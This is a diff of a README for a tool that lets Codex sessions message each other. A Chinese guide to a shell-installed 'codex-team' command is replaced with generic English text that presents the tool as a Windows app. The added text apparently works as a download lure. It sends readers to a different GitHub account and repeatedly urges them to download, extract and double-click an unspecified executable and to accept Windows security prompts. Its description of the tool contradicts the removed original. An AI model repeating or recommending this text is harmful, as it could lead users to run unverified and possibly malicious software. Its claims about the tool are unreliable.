@@ -1,58 +1,157 @@
-# codex-inter-agent-chat
+# 🧩 codex-inter-agent-chat - Chat Between Codex Sessions
 
-![codex-inter-chat-demo](./assets/demo/codex-inter-chat-demo-3x.gif)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/researchstaffpone610/codex-inter-agent-chat)
 
-- [English](./README.en.md)
+## 🚀 What this app does
 
-## 快速入口
+codex-inter-agent-chat is a Windows terminal app for chat between separate Codex sessions. It helps one session pass messages to another session without manual copy and paste.
 
-### 安装
+Use it when you want:
+- one Codex session to send a task
+- another Codex session to reply
+- a simple terminal view for back and forth chat
+- a local workflow that stays focused on your own machine
 
-```bash
-PROJECT_ROOT=/path/to/codex-inter-agent-chat
-$PROJECT_ROOT/tools/install-skill.sh
-```
+## 📥 Download and run on Windows
 
-安装器会做两件事：
-- 安装 skill 到你现有的 `~/.codex/skills`
-- 安装真正可执行的 `codex-team` 命令到你当前 `codex` 所在的用户 bin 目录
+1. Open the download page: [https://github.com/researchstaffpone610/codex-inter-agent-chat](https://github.com/researchstaffpone610/codex-inter-agent-chat)
+2. On the page, look for the latest release or the main download area.
+3. Download the Windows app file if one is listed there.
+4. If the file is a ZIP file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows asks for permission, choose **Yes**.
+8. Keep the terminal window open while you use the app.
 
-如果当前 shell 还没刷新，执行一次：
+If you do not see a ready-to-run file, open the repository page and check the release area for the latest Windows build.
 
-```bash
-source ~/.zshrc
-```
+## 🖥️ System requirements
 
-### 启动一个启用了 team 通信的 Codex
+This app is meant for Windows desktop use. For the best result, use:
+- Windows 10 or Windows 11
+- A terminal window with standard access
+- An internet connection for GitHub access
+- Enough free space to store the app and chat data
 
-```bash
-codex-team --team reverse --agent-name agent-a
-```
+A modern Windows laptop or desktop should be fine.
 
-### 查看当前 team 成员
+## ✨ What you can do with it
 
-```bash
-codex-team list --team reverse
-```
+- send short messages between Codex sessions
+- keep task handoff clear
+- compare replies from two independent sessions
+- track progress in a terminal view
+- reduce copy and paste work
+- keep the workflow inside GitHub and the terminal
 
-### 给同 team 内的另一个 Codex 发消息
+## 🔧 How it works
 
-```bash
-codex-team send --team reverse \
-  --to agent-b \
-  --message "继续跑 tests，然后把结果回我"
-```
+The app is built around a simple idea:
+- one session writes a message
+- the message appears for the other session
+- the other session reads it and responds
+- both sessions keep their own state
 
-## 说明
+This makes it useful for task splitting, review loops, and quick back and forth work when you want two Codex sessions to act in a shared chat pattern.
 
-- 默认**不启用** inter-agent chat。
-- 安装后直接可用 `codex-team` 命令。
-- 只有通过 `codex-team` 显式启动的 Codex 会启用互聊。
-- 不同 `--team` 之间完全隔离。
-- `codex-team` 完全继承原 `codex` 的配置、MCP、skills，只额外 append team 相关环境变量。
-- 普通 `codex` 启动方式不受影响。
+## 🪟 First-time setup on Windows
 
-## Credit
+Follow these steps the first time you run it:
 
-- [tessron/claude-code-skills](https://github.com/tessron/claude-code-skills/)
-- [Linux.do](https://linux.do)
+1. Download the app from the GitHub page.
+2. Save the file to your Downloads folder.
+3. If the file is zipped, extract it.
+4. Open the folder that contains the app.
+5. Start the app by double-clicking the main file.
+6. If Windows shows a security prompt, choose the option that lets you run the file.
+7. Leave the app open in the terminal.
+8. Open a second Codex session if you want to chat between two sessions.
+
+If the app opens in a terminal window, do not close that window while you are using it.
+
+## 💬 Basic use
+
+A simple flow looks like this:
+
+1. Start the app in one terminal window.
+2. Start a second Codex session in another terminal or window.
+3. Write a message in one session.
+4. Read the reply in the other session.
+5. Continue the chat as needed.
+
+Use short messages when possible. Clear text makes it easier for each session to follow the thread.
+
+## 🧭 Suggested use cases
+
+This app can help with:
+
+- task handoff between two Codex sessions
+- reviewing code or text from a second point of view
+- splitting a larger job into smaller steps
+- keeping one session focused on planning and another on execution
+- checking output before you move on
+- managing a simple shared terminal chat
+
+## 🗂️ Folder layout
+
+A typical download may include:
+
+- the main app file
+- a readme file
+- a config file
+- a log file
+- supporting folders for chat data or session data
+
+If you see extra files, keep them in the same folder as the app. The app may use them to save chat state or settings.
+
+## ⌨️ Common actions
+
+Here are the kinds of actions you may use while working with the app:
+
+- open the app
+- start a new chat flow
+- send a message
+- read the current message
+- refresh the view
+- switch between sessions
+- clear old messages
+- close the app when done
+
+The exact keys or commands may vary by release, but the flow stays the same.
+
+## 🛠️ Troubleshooting
+
+If the app does not open:
+- check that the file finished downloading
+- make sure you extracted the ZIP file
+- try running the app from the folder where it was unpacked
+- right-click the file and choose to run it again
+
+If the terminal closes right away:
+- open a terminal first
+- run the app from inside that terminal
+- keep the window open until you finish
+
+If you cannot find the file:
+- go back to the GitHub page
+- look for the latest release or download area
+- check for a Windows build
+
+If chat text does not appear:
+- refresh the app view
+- make sure both sessions are open
+- check that both sessions use the same chat flow
+
+## 🔒 Privacy and local use
+
+This app is meant for local terminal use. That makes it a good fit for work where you want to keep the chat on your own machine. It helps you move messages between Codex sessions without using a separate chat tool.
+
+## 📌 Quick start
+
+1. Open the GitHub page.
+2. Download the Windows app.
+3. Extract the file if needed.
+4. Run the app.
+5. Open a second Codex session.
+6. Start the chat flow.
+7. Send your first message between sessions
